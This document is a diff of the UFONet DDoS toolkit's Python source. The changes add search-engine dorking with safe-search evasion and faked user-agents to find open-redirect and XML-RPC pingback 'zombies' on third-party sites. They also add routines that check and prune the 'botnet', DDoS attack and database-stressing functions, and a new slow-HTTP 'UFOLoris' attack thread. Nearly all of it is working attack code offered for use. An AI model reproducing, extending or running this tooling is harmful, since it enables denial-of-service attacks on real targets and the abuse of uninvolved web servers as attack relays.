+               q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results [ deprecated ]
+            data = 'q=' + q + '&b=&kl=us-en&kp=-1' # evade safe search
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("[Info] Query used: " + url + " [POST -> " + data + "]\n")
+            try:
+                req = urllib2.Request(url, data, headers)
+                rsp = urllib2.urlopen(req)
+                content = rsp.read()
+            except:
+                print('[Error] - Unable to connect to duck\n')
+                if options.allengines:
+                    return
+                if not options.dorks:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = '<a class="result__url" href="(.+?)"' # regex magics [05/08/2016]
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
+        if options.engine == 'bing': # using bing [04/02/2018: OK!]
             url = 'https://www.bing.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
@@ -1342,7 +1662,7 @@ class UFONet(object):
                     return
                 if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
-                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
+                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
                     else:
                         update_reply = "Y"
                     if update_reply == "n" or update_reply == "N":
@@ -1359,55 +1679,55 @@ class UFONet(object):
             regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-        #elif options.engine == 'google': # google [07/10/2015: OK!] [09/08/2016: not working from TOR]
-        #    url = 'https://www.google.com/xhtml?'
-        #    if options.search: # search from query
-        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
-        #    if options.dorks: # search from a dork
-        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
-        #    start = 0 # set index number of first entry
-        #    if options.num_results: # set number of results to search
-        #        try:
-        #            num = int(options.num_results)
-        #        except:
-        #            print("You should specify an integer!!!. Using default value: 10\n")
-        #            num = 10
-        #    else:
-        #        num = 10 
-        #    gws_rd = 'ssl' # set SSL as default
-        #    query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
-        #    data = urllib.urlencode(query_string)
-        #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("Query used: " + url + "\n")
-        #    try:
-        #        req = urllib2.Request(url, None, headers)
-        #        req_reply = urllib2.urlopen(req).read()
-        #    except: 
-        #        print('[Error] - Unable to connect to google\n')
-        #        if options.allengines:
-        #            return
-        #        if not options.dorks:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Wanna try a different search engine (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-        #    regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
-        #    pattern = re.compile(regex)
-        #    url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'google': # google [07/10/2015: OK!] [09/08/2016: not working from TOR]
+            url = 'https://www.google.com/xhtml?'
+            if options.search: # search from query
+                q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks: # search from a dork
+                q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
+            start = 0 # set index number of first entry
+            if options.num_results: # set number of results to search
+                try:
+                    num = int(options.num_results)
+                except:
+                    print("You should specify an integer!!!. Using default value: 10\n")
+                    num = 10
+            else:
+                num = 10 
+            gws_rd = 'ssl' # set SSL as default
+            query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
+            data = urllib.urlencode(query_string)
+            url = url + data
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + "\n")
+            try:
+                req = urllib2.Request(url, None, headers)
+                req_reply = urllib2.urlopen(req).read()
+            except: 
+                print('[Error] - Unable to connect to google\n')
+                if options.allengines:
+                    return
+                if not options.dorks:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
         elif options.engine == 'yahoo': # yahoo [27/06/2017: OK!]
             #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
             location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
@@ -1434,7 +1754,7 @@ class UFONet(object):
                     return
                 if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
-                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
+                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
                     else:
                         update_reply = "Y"
                     if update_reply == "n" or update_reply == "N":
@@ -1476,7 +1796,7 @@ class UFONet(object):
                     return
                 if not options.dorks or not options.autosearch:
                     if not self.options.forceyes:
-                        update_reply = raw_input("Wanna try a different search engine (Y/n)")
+                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
                     else:
                         update_reply = "Y"
                     if update_reply == "n" or update_reply == "N":
@@ -1503,7 +1823,7 @@ class UFONet(object):
             print('[Error] - This search engine is not supported!\n')
             if not options.dorks or options.autosearch:
                 if not self.options.forceyes:
-                    update_reply = raw_input("Wanna try a different search engine (Y/n)")
+                    update_reply = raw_input("Want to try a different search engine? (Y/n)")
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
@@ -1535,8 +1855,8 @@ class UFONet(object):
             if options.engine == "yahoo":
                 if 'RU=' in url: # regex magics [18/08/2016]
                     url = url.rsplit('RU=',1)[1] 
-                if '&u=' in url: # regex magics [08/04/2017]
-                    url = url.rsplit('&u=',1)[1]  
+                if 'UTF-8&u=' in url: # regex magics [05/02/2018]
+                    url = url.rsplit('UTF-8&u=',1)[1]  
             if options.engine == "yandex":
                 if 'rel="' in url: # regex magics [27/06/2017]
                     url = url.rsplit('rel=',1)[1] 
@@ -1550,27 +1870,29 @@ class UFONet(object):
             url_link = url_link.rsplit(sep, 1)[0] + sep
             if 'href="' in url_link:
                 url_link = url_link.rsplit('href="', 1)[1]
-            if "instreamset" in url_link:
-                pass
+            if "instreamset" in url_link: # invalid zombie
+                url_link = "" # discarded
+            if '" ' in url_link:
+                url_link = url_link.rsplit('" ', 1)[1]
+            if options.engine in url_link:
+                url_link = "" # discarded
+            if 'http' not in url_link:
+                url_link = "" # discarded
             else:
-                if url_link not in zombies: # parse possible repetitions
+                if url_link not in zombies and url_link+os.linesep not in zombies_found and url_link is not "": # AI mode (parsing search engines mixed pool and stored army)
                     print('+Victim found: ' + url_link)
                     print '-'*12
                     zombies.append(url_link)
                 else:
                     pass
         if len(zombies) == 0: # print dorking results
-            print "[Info] - Not any possible victim(s) found for this query!"
+            print "[Info] - NOT any NEW victim(s) found for this query!"
             if not options.dorks:
                 if not options.autosearch:
                     if not self.options.forceyes:
                         return #sys.exit(2)
-        print '\n' + '='*22
-        print('+Possible Zombies: ' + str(len(zombies)))
+        print "\n" + '-'*44 + '\n'
         self.total_possible_zombies = self.total_possible_zombies + len(zombies)
-        print '='*22 + '\n'
-        if options.dorks or options.autosearch:
-            print '-'*44 + '\n'
         return zombies
 
     def check_nat(self):
@@ -1664,7 +1986,7 @@ class UFONet(object):
         if num_is_down > 0 and num_is_up == 0: # check for: 1 or more down, 0 up
             print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
             if not self.options.forceyes:
-                update_reply = raw_input("Wanna send a [HEAD] check request from your proxy (y/N)")
+                update_reply = raw_input("Want to send a [HEAD] check request from your proxy? (y/N)")
                 print '-'*25
             else:
                 update_reply = "N"
@@ -1682,7 +2004,7 @@ class UFONet(object):
                         if self.options.web:
                             return 
                         else:
-                            sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
+                            sys.exit(2) # Debug traceback (without crash) to celebrate it! ;-)
                 except Exception:
                     print "[Error] Something wrong with your connection!"
                     if self.options.verbose:
@@ -1901,13 +2223,13 @@ class UFONet(object):
                 for x in zombie:
                     f.write(str(x) + os.linesep)
             f.close()
-
-        if options.test:
+        if options.test or options.testall:
+            if not options.test:
+                options.test = self.zombies_file
             f = open(options.test, "w") # re-write list only with zombies ready
             for zombie in zombies_ready:
                 f.write(zombie + os.linesep)
             f.close()
-
         if options.search or options.dorks or options.autosearch or options.download: # append only new zombies to list (dorking supported)
             f = open(self.zombies_file)
             zombies_on_file = f.read().splitlines()
@@ -1963,7 +2285,7 @@ class UFONet(object):
     def update_rpcs(self, rpcs_ready):
         # update rpcs on file
         options = self.options
-        if options.testrpc:
+        if options.testrpc or options.testall:
             f = open(self.rpcs_file, "w") # re-write list
             for rpc in rpcs_ready: # add only rpc verified zombies
                 f.write(rpc + os.linesep)
@@ -1982,43 +2304,177 @@ class UFONet(object):
         rpc_vulnerable = False
         self.user_agent = random.choice(self.agents).strip() # suffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        # send HTTP HEAD request searching for: X-Pingback
         try:
-            if rpc_host.startswith("http://"):
-                rpc_host = rpc_host.replace("http://", "")
-            if rpc_host.startswith("https://"):
-                rpc_host = rpc_host.replace("https://", "")
-            rpc_host = urlparse(rpc_host)
-            rpc_path = rpc_host.path.replace("\r", "")
-            self.head = True
-            reply = self.connect_zombie(rpc_path)
-            self.head = False
-            if "X-Pingback" in reply: # discovering pingback-enabled resources
-                m = re.search('X-Pingback: (.+?)\n', reply) # regex magics
-                rpc_pingback_url = m.group(1) # extract rpc server url
-                rpc_vulnerable = True
-            else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
-                req_rpc = urllib2.Request(rpc_host, None, headers)
-                req_rpc.get_method = lambda : 'GET'
-                rpc_code = urllib2.urlopen(req_rpc).read()
+            if self.options.testall: # testing_all
+                req = urllib2.Request(rpc_host, None, headers)
+                rpc_code = urllib2.urlopen(req).read()
                 rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                 for link in rpc_links:
                     if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
                         rpc_pingback_url = link[0]
                         rpc_vulnerable = True
+                        break # found it!
                     else: # not any XML-RPC discovering methods are working
                         rpc_pingback_url = rpc_host + "/xmlrpc.php"
                         rpc_vulnerable = False
+            else:
+                if rpc_host.startswith("http://"):
+                    rpc_host = rpc_host.replace("http://", "")
+                if rpc_host.startswith("https://"):
+                    rpc_host = rpc_host.replace("https://", "")
+                rpc_host = urlparse(rpc_host)
+                rpc_path = rpc_host.path.replace("\r", "")
+                self.head = True # send HTTP HEAD request searching for: X-Pingback
+                reply = self.connect_zombie(rpc_path)
+                self.head = False
+                if "X-Pingback" in reply: # discovering pingback-enabled resources
+                    m = re.search('X-Pingback: (.+?)\n', reply) # regex magics
+                    rpc_pingback_url = m.group(1) # extract rpc server url
+                    rpc_vulnerable = True
+                else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
+                    req_rpc = urllib2.Request(rpc_host, None, headers)
+                    req_rpc.get_method = lambda : 'GET'
+                    rpc_code = urllib2.urlopen(req_rpc).read()
+                    rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
+                    for link in rpc_links:
+                        if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
+                            rpc_pingback_url = link[0]
+                            rpc_vulnerable = True
+                            break # found it!
+                        else: # not any XML-RPC discovering methods are working
+                            rpc_pingback_url = rpc_host + "/xmlrpc.php"
+                            rpc_vulnerable = False
         except: # something wrong discovering XML-RPC Pingback
-            rpc_pingback_url = str(rpc_host.path) + "/xmlrpc.php"
+            if not self.options.testall:
+                rpc_pingback_url = str(rpc_host.path) + "/xmlrpc.php"
+            else:
+                rpc_pingback_url = str(rpc_host) + "/xmlrpc.php"
             rpc_vulnerable = False
         return rpc_vulnerable, rpc_pingback_url
+
+    def testing_offline(self):
+        # check for zombies offline
+        print ("\nChecking for 'zombies' offline!\n")
+        print '='*35
+        zombies_online = 0
+        zombies_offline = 0
+        zombies = self.extract_zombies()
+        rpcs = self.extract_rpcs()
+        aliens = self.extract_aliens()
+        droids = self.extract_droids()
+        ucavs = self.extract_ucavs()
+        try:
+            botnet = zombies + rpcs + aliens + droids + ucavs
+        except:
+            return
+        discarded = [] # for discarded zombies
+        if not botnet:
+            return
+        self.head = True
+        for zombie in botnet:
+            zombie = str(zombie)
+            t = urlparse(zombie)
+            name_zombie = t.netloc
+            reply = str(self.connect_zombie(zombie))
+            if reply == "200" or reply == "302" or reply == "301" or reply == "401" or reply == "403" or reply == "405" or reply == '500':
+                status = "ONLINE!"
+                zombies_online = zombies_online + 1
+            else:
+                status = "NOT Working!"
+                zombies_offline = zombies_offline + 1
+            if zombie in zombies: # set zombie type (this way because cannot be same zombie with different type)
+                zombie_type = 'Zombie'
+            elif zombie in rpcs:
+                zombie_type = 'XML-RPC'
+            elif zombie in aliens:
+                zombie_type = 'Alien'
+            elif zombie in droids:
+                zombie_type = 'Droid'
+            elif zombie in ucavs:
+                zombie_type = 'UCAV'
+            print "\nName:", name_zombie
+            print "Type: [", zombie_type, "]"
+            print "Vector:", zombie
+            print "HTTP Code:", reply
+            print "STATUS:", status
+            print '-'*21
+            if status == "NOT Working!": # add to discarded zombies
+                if zombie not in discarded:
+                    discarded.append(zombie)
+        print "\n" + '='*52
+        print "\n+ Total Botnet:", len(botnet)
+        print "\n" + '-'*25 + "\n"
+        print "  - ONLINE:", zombies_online
+        print "  - OFFLINE:", zombies_offline, "\n"
+        print '='*52 + '\n'
+        self.head = False
+        if zombies_offline > 0:
+            if not self.options.forceyes:
+                test_reply = raw_input("Want to update your army? (Y/n)\n")
+                print '-'*25 + "\n"
+            else:
+                test_reply = "Y"
+            if test_reply == "n" or test_reply == "N":
+                print "Bye!\n"
+                return
+            else:
+                disc_zombies = self.discard_zombies(discarded) # discard zombies from botnet (remove from files)
+                print '='*52
+                print "\n  - DISCARDED:", disc_zombies
+                new_botnet = int(len(botnet) - disc_zombies)
+                print "\n+ New Total Botnet:", str(new_botnet), "\n"
+                print '='*52 + '\n'
+        else:
+            print "[Info] ALL checked 'zombies' are ONLINE... Exiting!\n"
+
+    def discard_zombies(self, discarded):
+        disc_zombies = 0
+        zombies_list = [self.zombies_file, self.aliens_file, self.droids_file, self.ucavs_file, self.rpcs_file]
+        for l in zombies_list:
+            f = open(l, "r+")
+            d = f.readlines()
+            f.close()
+            f = open(l, "w")
+            disc_zombies = self.remove_discarded_zombies(f, d, discarded, disc_zombies)
+            f.close()
+        return disc_zombies
+
+    def remove_discarded_zombies(self, f, d, discarded, disc_zombies):
+        m = []
+        for zombie_disc in discarded:
+            if zombie_disc.endswith(os.linesep):
+                zombie_disc = zombie_disc.replace(os.linesep, "")
+            elif zombie_disc.endswith("\r"):
+                zombie_disc = zombie_disc.replace("\r", "")
+            elif zombie_disc.endswith("\r" + os.linesep):
+                zombie_disc = zombie_disc.replace("\r" + os.linesep, "")
+            for z in d:
+                if z.endswith(os.linesep):
+                    z = z.replace(os.linesep, "")
+                elif z.endswith("\r"):
+                    z = z.replace("\r", "")
+                elif z.endswith("\r" + os.linesep):
+                    z = z.replace("\r" + os.linesep, "")
+                if z == zombie_disc:
+                    disc_zombies = disc_zombies + 1
+                else:
+                    if z not in m and z not in discarded:
+                        m.append(z)
+        if not m:
+            f.write("")
+        else:
+            for z in m:
+                f.write(z)
+
+        return disc_zombies
 
     def testing_rpcs(self, rpcs):
         # discover/test XML-RPC Pingback vulnerabilities on webapps (Wordpress, Drupal, PostNuke, b2evolution, 
         # Xoops, PHPGroupWare, TikiWiki, etc...) and update list
+        if self.options.testall: #testing_all
+            print '='*51
         print ("Are 'plasma' reflectors ready? :-) (XML-RPC Check):")
-        print '='*35
+        print '='*51
         num_active_rpcs = 0
         num_failed_rpcs = 0
         rpcs_ready = []
@@ -2043,45 +2499,48 @@ class UFONet(object):
                             rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
                             num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
                         else:
-                            print "\n[Info] Is NOT vulnerable..."
+                            print "\n[Info] It is NOT vulnerable..."
                             num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                     except:
                         print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
                         num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                 else:
-                    print "\n[Info] Is NOT vulnerable..."
+                    print "\n[Info] It is NOT vulnerable..."
                     num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
             print '-'*10
         print '='*18
         print "OK:", num_active_rpcs, "Fail:", num_failed_rpcs
         print '='*18
-        # update 'rpcs' list
-        if num_active_rpcs == 0:
-            print "\n[Info] - Not any vulnerable 'rpc' active!\n"
-            return #sys.exit(2)
+        if self.options.testall: # testing_all
+            return rpcs_ready, num_active_rpcs, num_failed_rpcs
         else:
-            if not self.options.forceyes:
-                update_reply = raw_input("Wanna update your army (Y/n)")
-                print '-'*25
-            else:
-                update_reply = "Y"
-            if update_reply == "n" or update_reply == "N":
-                print "\nBye!\n"
+            # update 'rpcs' list
+            if num_active_rpcs == 0:
+                print "\n[Info] - Not any vulnerable 'rpc' active!\n"
                 return #sys.exit(2)
             else:
-                self.update_rpcs(rpcs_ready)
-                if not self.options.upload:
-                    print "\n[Info] - Botnet updated! ;-)\n"
+                if not self.options.forceyes:
+                    update_reply = raw_input("Want to update your army? (Y/n)")
+                    print '-'*25
+                else:
+                    update_reply = "Y"
+                if update_reply == "n" or update_reply == "N":
+                    print "\nBye!\n"
+                    return #sys.exit(2)
+                else:
+                    self.update_rpcs(rpcs_ready)
+                    if not self.options.upload:
+                        print "\n[Info] - Botnet updated! ;-)\n"
 
     def testing(self, zombies):
         # test Open Redirect vulnerabilities on webapps and show statistics
         # HTTP HEAD check
+        army = 0
         print ("Are 'they' alive? :-) (HEAD Check):")
         print '='*35
         num_active_zombies = 0
         num_failed_zombies = 0
         active_zombies = []
-        army = 0
         print "Trying:", len(zombies)
         print '-'*21
         for zombie in zombies:
@@ -2122,10 +2581,7 @@ class UFONet(object):
         self.herd.reset()
         print '='*18
         print "OK:", num_active_zombies, "Fail:", num_failed_zombies
-        print '='*18
-        if num_active_zombies == 0:
-            print "\n[Info] - Not any zombie active!\n"
-            return #sys.exit(2)
+        print '='*18 + "\n"
         print '='*22
         # check url parameter vectors
         print ("Checking for payloads:")
@@ -2134,7 +2590,10 @@ class UFONet(object):
         print '-'*21
         zombies_ready = []
         num_waiting_zombies = 0
-        num_disconnected_zombies = 0
+        if num_active_zombies == 0:
+            num_disconnected_zombies = num_failed_zombies
+        else:
+            num_disconnected_zombies = 0
         for zombie in active_zombies:
             zombie = str(zombie)
             t = urlparse(zombie)
@@ -2161,7 +2620,7 @@ class UFONet(object):
             self.payload = False
             if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
                 num_waiting_zombies = num_waiting_zombies + 1
-                print "Status:", "Waiting to your orders..."
+                print "Status:", "Waiting for orders..."
                 zombies_ready.append(zombie)
             else:
                 num_disconnected_zombies = num_disconnected_zombies + 1
@@ -2171,28 +2630,24 @@ class UFONet(object):
         self.herd.reset()
         print '='*18
         print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
-        print '='*18
-        print '='*18
+        print '='*18 + "\n"
         # list of 'zombies' ready to attack
-        print ("Army of 'zombies'")
-        print '='*18
         num_active_zombie = 0
         for z in zombies_ready:
             t = urlparse(z)
             name_zombie = t.netloc
             num_active_zombie = num_active_zombie + 1
             if self.options.verbose:
-                print "Zombie [", num_active_zombie, "]:", name_zombie
-        print '-'*18
-        print "Total Army:", num_active_zombie
-        print '-'*18
-        # update 'zombies' list
-        if num_active_zombie == 0:
-            print "\n[Info] - Not any zombie active!\n"
-            return #sys.exit(2)
+                print "Zombie [", num_active_zombie, "]:", name_zombie + "\n"
+        if self.options.testall: # testing_all
+            return zombies_ready, num_waiting_zombies, num_disconnected_zombies + num_failed_zombies
         else:
+            print '-'*25 + "\n"
+            print '='*24
+            print "Working 'zombies':", num_active_zombie
+            print '='*24
             if not self.options.forceyes:
-                update_reply = raw_input("Wanna update your army (Y/n)")
+                update_reply = raw_input("\nWant to update your army? (Y/n)")
                 print '-'*25
             else:
                 update_reply = "Y"
@@ -2205,8 +2660,50 @@ class UFONet(object):
                     print "\n[Info] - Botnet updated! ;-)\n"
                     self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)
 
+    def testing_all(self):
+        # test whole botnet
+        print ("\nChecking if ALL your zombies are still infected (WARNING: this may take serveral time!)\n")
+        print '='*35
+        zombies = self.extract_zombies()
+        rpcs = self.extract_rpcs()
+        aliens = self.extract_aliens()
+        droids = self.extract_droids()
+        ucavs = self.extract_ucavs()
+        try:
+            botnet = zombies + rpcs + aliens + droids + ucavs
+            tested_zombies = zombies + rpcs # test types supported: zombies + xml-rpcs
+        except:
+            return
+        zombies_ready, num_waiting_zombies, num_disconnected_zombies = self.testing(zombies)
+        rpcs_ready, num_active_rpcs, num_failed_rpcs = self.testing_rpcs(rpcs)
+        print "\n" + '='*52
+        print "\n+ Total Botnet:", len(botnet)
+        print "\n" + '-'*25
+        print "\n+ Total Tested:", len(tested_zombies)
+        print "\n  - Zombies :", len(zombies), " [ OK:", str(num_waiting_zombies), "| FAILED:", str(num_disconnected_zombies), "]"
+        print "  - XML-RPCs:", len(rpcs), " [ OK:", str(num_active_rpcs), "| FAILED:", str(num_failed_rpcs), "]" + "\n"
+        print '='*52 + '\n'
+        if num_disconnected_zombies > 0 or num_failed_rpcs > 0:
+            if not self.options.forceyes:
+                update_reply = raw_input("Want to update your army? (Y/n)")
+                print '-'*25
+            else:
+                update_reply = "Y"
+            if update_reply == "n" or update_reply == "N":
+                print "\nBye!\n"
+                return #sys.exit(2)
+            else:
+                if num_disconnected_zombies > 0:
+                    self.update_zombies(zombies_ready)
+                if num_failed_rpcs > 0:
+                    self.update_rpcs(rpcs_ready)
+                if not self.options.upload:
+                    print "\n[Info] - Botnet updated! ;-)\n"
+        else:
+            print "[Info] ALL tested 'zombies' are working... Exiting!\n"
+
     def attacking(self, zombies):
-        # Perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
+        # perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
         target = self.options.target
         if target.startswith("https://"):
             target = target.replace("https://", "http://") # change target to 'http' (to evade a possible invalid SSL certificate)
@@ -2219,7 +2716,7 @@ class UFONet(object):
             print "\n[Error] - Target url not valid! -> It should starts with 'http(s)://'\n"
 
     def stressing(self, target, zombie):
-        # Perform a DDoS Web attack against a target, requesting records on target's database
+        # perform a DDoS Web attack against a target, requesting records on target's database
         db_input = self.options.dbstress
         def random_key(length):
             key = ''
@@ -2258,7 +2755,7 @@ class UFONet(object):
             print '[Info] DB query: Hit!'
 
     def attackme(self, zombies):
-        # Perform a DDoS Web attack against yourself
+        # perform a DDoS Web attack against yourself
         print "Starting local port to listening at: " + self.port + "\n" 
         print '='*21 + "\n"
         self.doll=Doll(self)
@@ -2278,7 +2775,7 @@ class UFONet(object):
         head_check_external = False
         print '='*21
         if options.disablehead: # check at start is disabled (skipping!)
-            print "[Info] Skipping external check of target's status...\n"
+            print "\n[Info] Skipping external check of target's status...\n"
             head_check_here = True
             head_check_external = True
         else:
@@ -2321,7 +2818,7 @@ class UFONet(object):
                 print '-'*21
             else:
                 head_check_here = True
-            # check target on third party service
+            # check target on third part service
             self.external = True
             if not options.attackme:
                 try:
@@ -2372,14 +2869,14 @@ class UFONet(object):
             if not self.options.forceyes: 
                 if not options.attackme:
                     if not options.disablehead:
-                        start_reply = raw_input("[Info] Your target looks ONLINE!. Wanna start a DDoS attack? (y/N)\n")
+                        start_reply = raw_input("[Info] Your target looks ONLINE!. Want to start a DDoS attack? (y/N)\n")
                     else:
-                        start_reply = raw_input("[Info] Wanna start a DDoS attack directly? (y/N)\n")
+                        start_reply = raw_input("[Info] Want to start a DDoS attack directly? (y/N)\n")
                 else:
                     if not options.disablehead:
-                        start_reply = raw_input("[Info] Your mothership looks READY!. Wanna start a DDoS attack against yourself? (y/N)\n")
+                        start_reply = raw_input("[Info] Your mothership looks READY!. Want to start a DDoS attack against yourself? (y/N)\n")
                     else:
-                        start_reply = raw_input("[Info] Wanna start a DDoS attack against yourself directly? (y/N)\n")
+                        start_reply = raw_input("[Info] Want to start a DDoS attack against yourself directly? (y/N)\n")
             else:
                 start_reply = "Y"
             if start_reply == "y" or start_reply == "Y":
@@ -2406,6 +2903,20 @@ class UFONet(object):
                     t.daemon = True
                     t.start()
                     self.update_loic_stats() # add new LOIC attack to mothership
+                # start multi-threading DoS Slow+Poison HTTP requests (UFOLoris)
+                if self.options.slow:
+                    try:
+                        self.options.slow = int(self.options.slow)
+                    except:
+                        self.options.slow = 101 # default UFOLoris requests (apache -> max_clients: ~100 | nginx -> no limit (other method))
+                    if self.options.slow < 1:
+                        self.options.slow = 101 # default UFOLoris requests
+                    self.instance = LORIS() # instance main class for UFOLoris operations
+                    t = threading.Thread(target=self.instance.attacking, args=(target, self.options.slow)) # attack with UFOLoris
+                    t.daemon = True
+                    t.start()
+                    self.update_loris_stats() # add new LORIS attack to mothership
+                    time.sleep(5)
                 # start to attack the target with each zombie
                 zombies = self.extract_zombies() # extract zombies from file
                 total_zombie = len(zombies)
